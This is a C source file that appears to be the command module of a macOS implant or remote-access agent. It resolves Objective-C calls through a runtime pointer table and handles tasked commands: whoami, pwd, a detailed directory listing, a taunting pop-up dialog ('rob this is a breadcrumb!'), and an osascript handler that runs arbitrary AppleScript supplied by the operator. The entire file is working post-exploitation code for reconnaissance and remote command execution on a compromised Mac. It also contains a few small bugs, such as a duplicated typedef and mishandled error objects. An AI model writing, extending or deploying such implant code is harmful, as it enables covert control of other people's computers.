#include "commands.h"
#include <objc/objc.h>  // for id
#include <pwd.h>
#include <runtime/xspring.h>
#include <stdint.h>  // for uint64_t
#include <stdio.h>   // for snprintf
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "darwin.h"

#define COMMAND_BUFFER_SIZE 4096

#ifdef __LP64__
typedef unsigned long NSUInteger;
#else
typedef unsigned int NSUInteger;
#endif

#ifdef __LP64__
typedef unsigned long NSUInteger;
typedef long NSInteger;
#else
typedef unsigned int NSUInteger;
typedef int NSInteger;
#endif

typedef char* (*command_handler)(INSTANCE* instance);
typedef char* (*command_handler_with_args)(INSTANCE* instance,
                                           const char* args);

typedef struct {
  char* name;
  union {
    command_handler handler;
    command_handler_with_args handler_with_args;
  };
  bool has_args;
} CommandEntry;

static char* cmd_whoami(INSTANCE* instance) {
  struct passwd* pw = getpwuid(geteuid());
  if (!pw) {
    return strdup("Error: Unable to determine current user");
  }
  return strdup(pw->pw_name);
}

static char* cmd_pwd(INSTANCE* instance) {
  char cwd[PATH_MAX];
  if (!getcwd(cwd, sizeof(cwd))) {
    return strdup("Error: Unable to get current directory");
  }
  return strdup(cwd);
}

static char* cmd_ls(INSTANCE* instance) {
  DEBUG_LOG("Starting ls command");

  if (!instance) {
    DEBUG_LOG("Error: Null instance pointer");
    return strdup("Error: Internal error - null instance");
  }

  char* result = malloc(COMMAND_BUFFER_SIZE);
  if (!result) {
    DEBUG_LOG("Error: Failed to allocate result buffer");
    return strdup("Error: Memory allocation failed");
  }

  size_t offset = 0;

  // Get current working directory
  char cwd[PATH_MAX];
  if (!getcwd(cwd, sizeof(cwd))) {
    DEBUG_LOG("Error: Failed to get current working directory");
    free(result);
    return strdup("Error: Unable to get current directory");
  }
  DEBUG_LOG("Current working directory: %s", cwd);

  // Get NSString class and create path string
  Class NSStringClass = instance->Darwin.objc_getClass("NSString");
  if (!NSStringClass) {
    DEBUG_LOG("Error: Failed to get NSString class");
    free(result);
    return strdup("Error: Failed to get NSString class");
  }

  // Get stringWithUTF8String selector
  SEL stringWithUTF8StringSel =
      instance->Darwin.sel_registerName("stringWithUTF8String:");
  if (!stringWithUTF8StringSel) {
    DEBUG_LOG("Error: Failed to create stringWithUTF8String selector");
    free(result);
    return strdup("Error: Failed to create selector");
  }

  DEBUG_LOG("Creating path string from: %s", cwd);
  id pathString =
      ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
          NSStringClass, stringWithUTF8StringSel, cwd);

  if (!pathString) {
    DEBUG_LOG("Error: Failed to create path string");
    free(result);
    return strdup("Error: Failed to create path string");
  }

  DEBUG_LOG("Successfully created path string");

  // Get file manager
  DEBUG_LOG("Getting file manager");
  if (!instance->Darwin.NSFileManagerClass) {
    DEBUG_LOG("Error: NSFileManagerClass is null");
    free(result);
    return strdup("Error: FileManager class not initialized");
  }

  if (!instance->Darwin.defaultManagerSel) {
    DEBUG_LOG("Error: defaultManagerSel is null");
    free(result);
    return strdup("Error: FileManager selector not initialized");
  }

  DEBUG_LOG("Calling defaultManager on NSFileManager");
  id fileManager = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
      (id)instance->Darwin.NSFileManagerClass,
      instance->Darwin.defaultManagerSel);

  if (!fileManager) {
    DEBUG_LOG("Error: Failed to get file manager instance");
    free(result);
    return strdup("Error: Failed to create file manager");
  }

  DEBUG_LOG("Successfully got file manager instance");

  // Get directory contents
  DEBUG_LOG("Getting directory contents");
  if (!instance->Darwin.contentsOfDirectoryAtPathSel) {
    DEBUG_LOG("Error: contentsOfDirectoryAtPathSel is null");
    free(result);
    return strdup("Error: Directory contents selector not initialized");
  }

  id error = nil;
  DEBUG_LOG("Calling contentsOfDirectoryAtPath:error:");

  // Proper casting for the method call
  id contents = ((id(*)(id, SEL, id, id*))instance->Darwin.objc_msgSend)(
      fileManager, instance->Darwin.contentsOfDirectoryAtPathSel, pathString,
      &error);

  if (!contents) {
    DEBUG_LOG("Error: Failed to get directory contents");
    if (error) {
      // Try to get error description if available
      SEL descriptionSel = instance->Darwin.sel_registerName("description");
      if (descriptionSel) {
        id description = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
            error, descriptionSel);
        if (description) {
          const char* errorStr =
              ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
                  description, instance->Darwin.sel_registerName("UTF8String"));
          DEBUG_LOG("Error details: %s", errorStr ? errorStr : "Unknown error");
        }
      }
    }
    free(result);
    return strdup("Error: Unable to list directory contents");
  }

  DEBUG_LOG("Successfully got directory contents");
  // Get array count
  DEBUG_LOG("Getting array count");
  SEL countSel = instance->Darwin.sel_registerName("count");
  if (!countSel) {
    DEBUG_LOG("Error: Failed to create count selector");
    free(result);
    return strdup("Error: Failed to create count selector");
  }

  NSUInteger itemCount =
      ((NSUInteger(*)(id, SEL))instance->Darwin.objc_msgSend)(contents,
                                                              countSel);
  DEBUG_LOG("Found %lu items in directory", (unsigned long)itemCount);

  // Write header
  offset += snprintf(result + offset, COMMAND_BUFFER_SIZE - offset,
                     "Directory listing of %s:\n"
                     "----------------------------------------\n",
                     cwd);

  // Get required selectors
  DEBUG_LOG("Creating required selectors");
  SEL objectAtIndexSel = instance->Darwin.sel_registerName("objectAtIndex:");
  SEL UTF8StringSel = instance->Darwin.sel_registerName("UTF8String");
  SEL stringByAppendingPathComponentSel =
      instance->Darwin.sel_registerName("stringByAppendingPathComponent:");
  SEL fileSizeSel = instance->Darwin.sel_registerName("fileSize");
  SEL fileTypeSel = instance->Darwin.sel_registerName("fileType");
  SEL modificationDateSel =
      instance->Darwin.sel_registerName("fileModificationDate");
  SEL descriptionSel = instance->Darwin.sel_registerName("description");

  // Verify all selectors
  if (!objectAtIndexSel || !UTF8StringSel ||
      !stringByAppendingPathComponentSel || !fileSizeSel || !fileTypeSel ||
      !modificationDateSel || !descriptionSel) {
    DEBUG_LOG("Error: Failed to create one or more required selectors");
    free(result);
    return strdup("Error: Failed to create required selectors");
  }

  // Iterate through contents
  DEBUG_LOG("Starting directory iteration");
  for (NSUInteger i = 0; i < itemCount && offset < COMMAND_BUFFER_SIZE - 256;
       i++) {
    DEBUG_LOG("Processing item %lu of %lu", (unsigned long)i,
              (unsigned long)itemCount);

    // Get filename with proper casting
    id fileName = ((id(*)(id, SEL, NSUInteger))instance->Darwin.objc_msgSend)(
        contents, objectAtIndexSel, i);

    if (!fileName) {
      DEBUG_LOG("Error: Failed to get filename for index %lu",
                (unsigned long)i);
      continue;
    }

    // Get the filename as a C string
    const char* name =
        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
            fileName, UTF8StringSel);

    if (!name) {
      DEBUG_LOG("Error: Failed to get filename string for index %lu",
                (unsigned long)i);
      continue;
    }

    DEBUG_LOG("Processing file: %s", name);

    // Get full path for the file
    id fullPath = ((id(*)(id, SEL, id))instance->Darwin.objc_msgSend)(
        pathString, stringByAppendingPathComponentSel, fileName);

    if (!fullPath) {
      DEBUG_LOG("Error: Failed to create full path for %s", name);
      continue;
    }

    // Get file attributes
    id error = nil;
    id attributes = ((id(*)(id, SEL, id, id*))instance->Darwin.objc_msgSend)(
        fileManager, instance->Darwin.attributesOfItemAtPathSel, fullPath,
        &error);

    if (!attributes) {
      DEBUG_LOG("Error: Failed to get attributes for %s", name);
      continue;
    }

    // Get file size
    unsigned long long size =
        ((unsigned long long (*)(id, SEL))instance->Darwin.objc_msgSend)(
            attributes, fileSizeSel);

    // Get file type
    id fileType = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(attributes,
                                                                  fileTypeSel);

    const char* typeStr =
        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
            fileType, UTF8StringSel);

    // Get modification date
    id modDate = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
        attributes, modificationDateSel);

    id dateStr = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
        modDate, descriptionSel);

    const char* dateChars =
        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
            dateStr, UTF8StringSel);

    // Format and append the file information
    offset += snprintf(
        result + offset, COMMAND_BUFFER_SIZE - offset,
        "%-30s %8llu bytes  %-12s  %s\n", name ? name : "<unknown>", size,
        typeStr ? typeStr : "<unknown>", dateChars ? dateChars : "<unknown>");

    DEBUG_LOG("Successfully processed item %lu", (unsigned long)i);
  }

  DEBUG_LOG("Finished processing directory contents");
  return result;
}

static char* cmd_dialog(INSTANCE* instance) {
  DEBUG_LOG("Starting dialog command");

  if (!instance) {
    DEBUG_LOG("Error: Null instance pointer");
    return strdup("Error: Internal error - null instance");
  }

  // Create autorelease pool
  id pool = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.NSAutoreleasePoolClass,
      instance->Darwin.sel_registerName("new"));

  if (!pool) {
    DEBUG_LOG("Error: Failed to create autorelease pool");
    return strdup("Error: Failed to create autorelease pool");
  }

  // Initialize shared application
  id app = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.NSApplicationClass,
      instance->Darwin.sharedApplicationSel);

  if (!app) {
    DEBUG_LOG("Error: Failed to get shared application");
    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
        pool, instance->Darwin.sel_registerName("drain"));
    return strdup("Error: Failed to initialize application");
  }

  // Set activation policy to Accessory (important!)
  ((void (*)(id, SEL, NSInteger))instance->Darwin.objc_msgSend)(
      app, instance->Darwin.setActivationPolicySel,
      1  // NSApplicationActivationPolicyAccessory
  );

  // Activate the app
  ((void (*)(id, SEL, BOOL))instance->Darwin.objc_msgSend)(
      app, instance->Darwin.activateIgnoringOtherAppsSel, YES);

  // Get main run loop
  Class NSRunLoopClass = instance->Darwin.objc_getClass("NSRunLoop");
  SEL mainRunLoopSel = instance->Darwin.sel_registerName("mainRunLoop");
  id runLoop = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      NSRunLoopClass, mainRunLoopSel);

  // Create alert
  id alert = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.NSAlertClass, instance->Darwin.sel_registerName("new"));

  if (!alert) {
    DEBUG_LOG("Error: Failed to create alert");
    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
        pool, instance->Darwin.sel_registerName("drain"));
    return strdup("Error: Failed to create alert");
  }

  // Configure alert
  Class NSStringClass = instance->Darwin.objc_getClass("NSString");
  SEL stringWithUTF8StringSel =
      instance->Darwin.sel_registerName("stringWithUTF8String:");

  // Set message text
  id messageString =
      ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
          NSStringClass, stringWithUTF8StringSel, "rob this is a breadcrumb!");

  ((void (*)(id, SEL, id))instance->Darwin.objc_msgSend)(
      alert, instance->Darwin.sel_registerName("setMessageText:"),
      messageString);

  // Add OK button
  id okButtonTitle =
      ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
          NSStringClass, stringWithUTF8StringSel, "LOL");

  ((void (*)(id, SEL, id))instance->Darwin.objc_msgSend)(
      alert, instance->Darwin.sel_registerName("addButtonWithTitle:"),
      okButtonTitle);

  // Get window and set level
  SEL windowSel = instance->Darwin.sel_registerName("window");
  id alertWindow =
      ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(alert, windowSel);

  // Set window level
  ((void (*)(id, SEL, NSInteger))instance->Darwin.objc_msgSend)(
      alertWindow, instance->Darwin.sel_registerName("setLevel:"),
      8  // NSModalPanelWindowLevel = 8
  );

  // Run the alert
  SEL runModalSel = instance->Darwin.sel_registerName("runModal");
  NSInteger result = ((NSInteger(*)(id, SEL))instance->Darwin.objc_msgSend)(
      alert, runModalSel);

  DEBUG_LOG("Dialog closed with result: %ld", (long)result);

  // Run the run loop briefly to process events
  id date = ((id(*)(Class, SEL, double))instance->Darwin.objc_msgSend)(
      instance->Darwin.objc_getClass("NSDate"),
      instance->Darwin.sel_registerName("dateWithTimeIntervalSinceNow:"), 0.1);

  ((void (*)(id, SEL, id))instance->Darwin.objc_msgSend)(
      runLoop, instance->Darwin.sel_registerName("runUntilDate:"), date);

  // Format return string
  char* resultStr = NULL;
  if (result == 1000) {  // NSAlertFirstButtonReturn
    resultStr = strdup("OK clicked");
  } else {
    resultStr = strdup("Dialog closed");
  }

  // Clean up
  ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
      pool, instance->Darwin.sel_registerName("drain"));

  return resultStr;
}

static char* cmd_applescript(INSTANCE* instance, const char* script) {
  DEBUG_LOG("Executing AppleScript: %s", script);

  if (!instance || !script) {
    return strdup("Error: Invalid arguments");
  }

  // Create autorelease pool
  id pool = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.NSAutoreleasePoolClass,
      instance->Darwin.sel_registerName("new"));

  if (!pool) {
    return strdup("Error: Failed to create autorelease pool");
  }

  // Get shared application instance to ensure GUI access
  id app = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.NSApplicationClass,
      instance->Darwin.sharedApplicationSel);

  if (app) {
    // Activate the app
    ((void (*)(id, SEL, BOOL))instance->Darwin.objc_msgSend)(
        app, instance->Darwin.activateIgnoringOtherAppsSel, YES);
  }

  // Create script string
  id scriptString =
      ((id(*)(Class, SEL, const char*))instance->Darwin.objc_msgSend)(
          instance->Darwin.objc_getClass("NSString"),
          instance->Darwin.sel_registerName("stringWithUTF8String:"), script);

  if (!scriptString) {
    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
        pool, instance->Darwin.sel_registerName("drain"));
    return strdup("Error: Failed to create script string");
  }

  // Create and execute AppleScript
  id appleScript = ((id(*)(Class, SEL))instance->Darwin.objc_msgSend)(
      instance->Darwin.objc_getClass("NSAppleScript"),
      instance->Darwin.sel_registerName("alloc"));

  appleScript = ((id(*)(id, SEL, id))instance->Darwin.objc_msgSend)(
      appleScript, instance->Darwin.sel_registerName("initWithSource:"),
      scriptString);

  if (!appleScript) {
    ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
        pool, instance->Darwin.sel_registerName("drain"));
    return strdup("Error: Failed to create AppleScript instance");
  }

  id error = nil;
  id result = ((id(*)(id, SEL, id*))instance->Darwin.objc_msgSend)(
      appleScript, instance->Darwin.sel_registerName("executeAndReturnError:"),
      &error);

  char* output;
  if (result) {
    // Get string value of result
    id stringValue = ((id(*)(id, SEL))instance->Darwin.objc_msgSend)(
        result, instance->Darwin.sel_registerName("stringValue"));

    const char* resultStr =
        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
            stringValue, instance->Darwin.sel_registerName("UTF8String"));
    output = strdup(resultStr ? resultStr : "Success");
    DEBUG_LOG("AppleScript execution successful: %s", output);
  } else {
    const char* errorStr =
        ((const char* (*)(id, SEL))instance->Darwin.objc_msgSend)(
            error, instance->Darwin.sel_registerName("UTF8String"));
    output = strdup(errorStr ? errorStr : "Script execution failed");
    DEBUG_LOG("AppleScript execution failed: %s", output);
  }

  // Cleanup
  ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
      appleScript, instance->Darwin.sel_registerName("release"));

  ((void (*)(id, SEL))instance->Darwin.objc_msgSend)(
      pool, instance->Darwin.sel_registerName("drain"));

  return output;
}

static CommandEntry command_handlers[] = {
    {"whoami", {.handler = cmd_whoami}, false},
    {"ls", {.handler = cmd_ls}, false},
    {"pwd", {.handler = cmd_pwd}, false},
    {"dialog", {.handler = cmd_dialog}, false},
    {"osascript", {.handler_with_args = cmd_applescript}, true},
    {NULL, {.handler = NULL}, false}};

// Update get_command_handler function
command_handler get_command_handler(const char* command) {
  for (CommandEntry* entry = command_handlers; entry->name != NULL; entry++) {
    if (strcmp(entry->name, command) == 0 && !entry->has_args) {
      return entry->handler;
    }
  }
  return NULL;
}

command_handler_with_args get_command_handler_with_args(const char* command) {
  for (CommandEntry* entry = command_handlers; entry->name != NULL; entry++) {
    if (strcmp(entry->name, command) == 0 && entry->has_args) {
      return entry->handler_with_args;
    }
  }
  return NULL;
}
